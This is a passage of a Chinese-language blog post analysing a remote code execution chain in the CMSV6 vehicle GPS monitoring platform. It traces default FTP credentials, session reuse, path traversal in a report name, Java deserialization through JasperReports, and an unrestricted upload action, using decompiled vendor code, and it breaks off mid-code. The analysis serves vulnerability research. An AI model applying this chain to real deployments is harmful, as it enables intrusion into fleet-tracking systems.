src="/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240518225312913.png" alt="image-20240518225312913"></p><h3 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h3><p>文件上传有两种方式，一种通过FTP服务，如果用户为更改默认密码那么即可使用其登录上传文件</p><p>另一种，既然有了session，我们便很容易能够使用此session调用后台接口，比如<code>WebuploaderAction#ajaxAttachAllFileUpload</code></p><p><img src="/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240518225613963.png" alt="image-20240518225613963"></p><p>但很可惜的是代码中有关于上传文件后缀的严格限制，因此我们无法实现直接上传webshell文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String getsuffix = getsuffixEx(fileName);</span><br><span class="line"><span class="keyword">if</span> (!limitType(getsuffix)) &#123;</span><br></pre></td></tr></table></figure><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>但我们不必灰心，在公告中我们不难发现上传了一些名为<code>jasper</code>后缀的文件</p><p><img src="/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240518230403232.png" alt="image-20240518230403232"></p><p>因此我们需要去寻找加载恶意jasper文件的路由，在<code>com.gps808.operationManagement.action.StandardLineAction#report</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">report</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String format = <span class="keyword">this</span>.getRequestString(<span class="string">&quot;format&quot;</span>);</span><br><span class="line">        String name = <span class="keyword">this</span>.getRequestString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        String lid = <span class="keyword">this</span>.getRequestString(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        String direct = <span class="keyword">this</span>.getRequestString(<span class="string">&quot;direct&quot;</span>);</span><br><span class="line">        String disposition = <span class="keyword">this</span>.getRequestString(<span class="string">&quot;disposition&quot;</span>);</span><br><span class="line">        String reportTitle = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        StandardCompany line = (StandardCompany)<span class="keyword">this</span>.standardLineService.getObject(StandardCompany.class, Integer.parseInt(lid));</span><br><span class="line">        <span class="keyword">if</span> (line != <span class="keyword">null</span>) &#123;</span><br><span class="line">            reportTitle = line.getName();</span><br><span class="line">            <span class="keyword">if</span> (direct != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (direct.equals(<span class="string">&quot;0&quot;</span>)) &#123;</span><br><span class="line">                    reportTitle = reportTitle + <span class="string">&quot;S&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (direct.equals(<span class="string">&quot;1&quot;</span>)) &#123;</span><br><span class="line">                    reportTitle = reportTitle + <span class="string">&quot;X&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        AjaxDto&lt;StandardLineStationRelationStation&gt; stationRelation = <span class="keyword">this</span>.standardLineService.getLineStationInfos(Integer.parseInt(lid), Integer.parseInt(direct), <span class="number">1</span>, <span class="string">&quot; order by sindex asc &quot;</span>, (Pagination)<span class="keyword">null</span>);</span><br><span class="line">        List&lt;Map&gt; list = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        String language = <span class="keyword">this</span>.getAndUpdateSessionLanguage();</span><br><span class="line">        <span class="keyword">if</span> (stationRelation != <span class="keyword">null</span> &amp;&amp; stationRelation.getPageList() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = stationRelation.getPageList().size(); i &lt; j; ++i) &#123;</span><br><span class="line">                StandardLineStationRelationStation relation = (StandardLineStationRelationStation)stationRelation.getPageList().get(i);</span><br><span class="line">                Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">                map.put(<span class="string">&quot;sindex&quot;</span>, relation.getSindex());</span><br><span class="line">                map.put(<span class="string">&quot;name&quot;</span>, relation.getStation().getName());</span><br><span class="line">                map.put(<span class="string">&quot;direct&quot;</span>, <span class="keyword">this</span>.getStationDirectEx(relation.getStation().getDirect(), language));</span><br><span class="line">                map.put(<span class="string">&quot;stype&quot;</span>, <span class="keyword">this</span>.getStationTypeEx(relation.getStype(), language));</span><br><span class="line">                map.put(<span class="string">&quot;lngIn&quot;</span>, GpsUtil.formatPosition(relation.getStation().getLngIn()));</span><br><span class="line">                map.put(<span class="string">&quot;latIn&quot;</span>, GpsUtil.formatPosition(relation.getStation().getLatIn()));</span><br><span class="line">                map.put(<span class="string">&quot;angleIn&quot;</span>, relation.getStation().getAngleIn());</span><br><span class="line">                map.put(<span class="string">&quot;speed&quot;</span>, GpsUtil.getFormatSpeed(relation.getSpeed(), <span class="number">1</span>, <span class="keyword">new</span> Boolean[<span class="number">0</span>]));</span><br><span class="line">                map.put(<span class="string">&quot;len&quot;</span>, GpsUtil.getFormatLiCheng(relation.getLen()));</span><br><span class="line">                list.add(map);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map mapHeads = <span class="keyword">new</span> HashMap();</span><br><span class="line">        mapHeads.put(<span class="string">&quot;sindex&quot;</span>, LanguageCache.getLanguageTextEx(<span class="string">&quot;line_station_index&quot;</span>, language));</span><br><span class="line">        mapHeads.put(<span class="string">&quot;name&quot;</span>, LanguageCache.getLanguageTextEx(<span class="string">&quot;line_station_name&quot;</span>, language));</span><br><span class="line">        mapHeads.put(<span class="string">&quot;direct&quot;</span>, LanguageCache.getLanguageTextEx(<span class="string">&quot;line_station_direction&quot;</span>, language));</span><br><span class="line">        mapHeads.put(<span class="string">&quot;stype&quot;</span>, LanguageCache.getLanguageTextEx(<span class="string">&quot;line_station_type&quot;</span>, language));</span><br><span class="line">        mapHeads.put(<span class="string">&quot;lngIn&quot;</span>, LanguageCache.getLanguageTextEx(<span class="string">&quot;line_station_in_lng&quot;</span>, language));</span><br><span class="line">        mapHeads.put(<span class="string">&quot;latIn&quot;</span>, LanguageCache.getLanguageTextEx(<span class="string">&quot;line_station_in_lat&quot;</span>, language));</span><br><span class="line">        mapHeads.put(<span class="string">&quot;angleIn&quot;</span>, LanguageCache.getLanguageTextEx(<span class="string">&quot;line_station_in_angle&quot;</span>, language));</span><br><span class="line">        mapHeads.put(<span class="string">&quot;speed&quot;</span>, LanguageCache.getLanguageTextEx(<span class="string">&quot;line_station_limit_speed&quot;</span>, language) + <span class="string">&quot; (KM/H)&quot;</span>);</span><br><span class="line">        mapHeads.put(<span class="string">&quot;len&quot;</span>, LanguageCache.getLanguageTextEx(<span class="string">&quot;line_station_distance&quot;</span>, language) + <span class="string">&quot; (KM)&quot;</span>);</span><br><span class="line">        ReportPrint print = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            print = <span class="keyword">this</span>.getReportCreate().createReport(name);</span><br><span class="line">            print.setMapHeads(mapHeads);</span><br><span class="line">            print.setReportTitle(reportTitle);</span><br><span class="line">            print.setDateSource(list);</span><br><span class="line">            print.setFormat(format);</span><br><span class="line">            print.setDocumentName(name);</span><br><span class="line">            print.setDisposition(disposition);</span><br><span class="line">            print.exportReport();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">            <span class="keyword">this</span>.log.error(var15.getMessage(), var15);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ServletException var16) &#123;</span><br><span class="line">            <span class="keyword">this</span>.log.error(var16.getMessage(), var16);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">            <span class="keyword">this</span>.log.error(var17.getMessage(), var17);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var18) &#123;</span><br><span class="line">        <span class="keyword">this</span>.log.error(var18.getMessage(), var18);</span><br><span class="line">        <span class="keyword">this</span>.addCustomResponse(ACTION_RESULT, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这些代码中我们重点关注<code>this.getReportCreate().createReport(name);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.gpsCommon.action.CommonBaseAction</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> ReportCreater <span class="title">getReportCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.reportCreate == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.reportCreate = <span class="keyword">new</span> ReportCreater();</span><br><span class="line">        <span class="keyword">this</span>.reportCreate.setJasperReportPath(ServletActionContext.getServletContext().getRealPath(<span class="string">&quot;WEB-INF\\jasper&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.reportCreate;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// com.framework.jasperReports.ReportCreater#createReport</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ReportPrint <span class="title">createReport</span><span class="params">(String reportKey)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._createReport(reportKey);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (JRException var3) &#123;</span><br><span class="line">        <span class="keyword">this</span>.log.error(var3.getMessage(), var3);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>_createReport</code>的调用，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.framework.jasperReports.ReportCreater</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> ReportPrint <span class="title">_createReport</span><span class="params">(String reportKey)</span> <span class="keyword">throws</span> JRException, IOException </span>&#123;</span><br><span class="line">    JasperReport jasperReport = <span class="keyword">this</span>.getJasperReport(reportKey);</span><br><span class="line">    Map parameters = <span class="keyword">this</span>.getParameters_(reportKey);</span><br><span class="line">    ReportPrint reportPrint = <span class="keyword">new</span> ReportPrint(jasperReport, parameters);</span><br><span class="line">    <span class="keyword">return</span> reportPrint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> JasperReport <span class="title">getJasperReport</span><span class="params">(String reportKey)</span> <span class="keyword">throws</span> IOException, JRException </span>&#123;</span><br><span class="line">    JasperReport jasperReport = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.jasperDesignMap.containsKey(reportKey)) &#123;</span><br><span class="line">        jasperReport = (JasperReport)<span class="keyword">this</span>.jasperDesignMap.get(reportKey);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        jasperReport = <span class="keyword">this</span>.getJasperReportFromFile(reportKey);</span><br><span class="line">        <span class="keyword">this</span>.jasperDesignMap.put(reportKey, jasperReport);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jasperReport;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> JasperReport <span class="title">getJasperReportFromFile</span><span class="params">(String reportKey)</span> <span class="keyword">throws</span> IOException, JRException </span>&#123;</span><br><span class="line">    String filePath = <span class="keyword">this</span>.jasperReportPath + <span class="string">&quot;\\&quot;</span> + reportKey + <span class="string">&quot;.jasper&quot;</span>;</span><br><span class="line">    File reportFile = <span class="keyword">null</span>;</span><br><span class="line">    JasperReport jasperReport = <span class="keyword">null</span>;</span><br><span class="line">    reportFile = <span class="keyword">new</span> File(filePath);</span><br><span class="line">    <span class="keyword">if</span> (reportFile.exists() &amp;&amp; reportFile.isFile()) &#123;</span><br><span class="line">        jasperReport = (JasperReport)JRLoader.loadObject(reportFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jasperReport;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// net.sf.jasperreports.engine.util.JRLoader</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">loadObject</span><span class="params">(File file)</span> <span class="keyword">throws</span> JRException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> loadObject(DefaultJasperReportsContext.getInstance(), (File)file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">loadObject</span><span class="params">(JasperReportsContext jasperReportsContext, File file)</span> <span class="keyword">throws</span> JRException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (file.exists() &amp;&amp; file.isFile()) &#123;</span><br><span class="line">        Object obj = <span class="keyword">null</span>;</span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            BufferedInputStream bufferedIn = <span class="keyword">new</span> BufferedInputStream(fis);</span><br><span class="line">            ois = <span class="keyword">new</span> ContextClassLoaderObjectInputStream(jasperReportsContext, bufferedIn);</span><br><span class="line">            obj = ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JRException(<span class="string">&quot;util.loader.object.from.file.loading.error&quot;</span>, <span class="keyword">new</span> Object[]&#123;file&#125;, var17);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JRException(<span class="string">&quot;util.loader.class.not.found.from.file&quot;</span>, <span class="keyword">new</span> Object[]&#123;file&#125;, var18);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ois != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    ois.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var16) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fis != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fis.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JRException(<span class="keyword">new</span> FileNotFoundException(String.valueOf(file)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从以下调用链不难发现最终会通过文件内容触发反序列化执行，并且在这过程中文件名未做校验可以穿越到FTP服务目录下</p><p><code>com.framework.jasperReports.ReportCreater#_createReport</code>=&gt;<code>com.framework.jasperReports.ReportCreater#getJasperReport</code>=&gt;<code>com.framework.jasperReports.ReportCreater#getJasperReportFromFile</code>=&gt;<code>net.sf.jasperreports.engine.util.JRLoader#loadObject</code>=&gt;<code>net.sf.jasperreports.engine.util.ContextClassLoaderObjectInputStream#readObject</code></p><p>因此最终漏洞的完整利用就出来了</p><h3 id="尝试突破文件上传限制"><a href="#尝试突破文件上传限制" class="headerlink" title="尝试突破文件上传限制"></a>尝试突破文件上传限制</h3><p>但我们也知道如果仅仅是依赖ftp默认用户名实现文件上传的话那可就太难了，在开始前简单聊一下struts2的配置</p><p>在配置中写到了action的访问方式，但我们的路由访问并未出现全类名，那它是怎么找到具体的类的呢？</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*_*.action&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&#123;1&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&#123;2&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>经过查找，可以在<code>applicationContext-xxxx.xml</code>中定义的bean中找到答案，我们可以直接使用bean-name得到这个类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">&quot;StandardApiAction&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.gps808.api.action.StandardApiAction&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span> <span class="attr">parent</span>=<span class="string">&quot;standardUserBaseAction&quot;</span>&gt;</span></span><br><span class="line">xxxxxx</span><br></pre></td></tr></table></figure><p>而如果这个类未在xml中定义我们就需要使用全类名来标识这个类，此时我们便可以将目标锁定到<code>com.framework.web.action.FileUploadAction#upload</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.framework.web.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUploadAction</span> <span class="keyword">extends</span> <span class="title">BaseAction</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String describe;</span><br><span class="line">    <span class="keyword">private</span> List&lt;File&gt; uploadFile;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; uploadFileFileName;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; uploadFileContentType;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FileUploadAction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasOperatorPrivi</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">upload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.uploadFileFileName.size(); ++i) &#123;</span><br><span class="line">            BufferedInputStream bis = <span class="keyword">null</span>;</span><br><span class="line">            BufferedOutputStream bos = <span class="keyword">null</span>;</span><br><span class="line">            String fileName = (String)<span class="keyword">this</span>.uploadFileFileName.get(i);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(fileName)) &#123;</span><br><span class="line">                    FileInputStream fis = <span class="keyword">new</span> FileInputStream((File)<span class="keyword">this</span>.uploadFile.get(i));</span><br><span class="line">                    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\&quot;</span> + fileName);</span><br><span class="line">                    bis = <span class="keyword">new</span> BufferedInputStream(fis);</span><br><span class="line">                    bos = <span class="keyword">new</span> BufferedOutputStream(fos);</span><br><span class="line">                    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="keyword">int</span> len = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">int</span> len;</span><br><span class="line">                    <span class="keyword">while</span>((len = bis.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        bos.write(b, <span class="number">0</span>, len);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (bis != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        bis.close();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (bos != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        bos.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var16) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">image</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.upload();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            <span class="keyword">this</span>.log.error(var2.getMessage(), var2);</span><br><span class="line">            <span 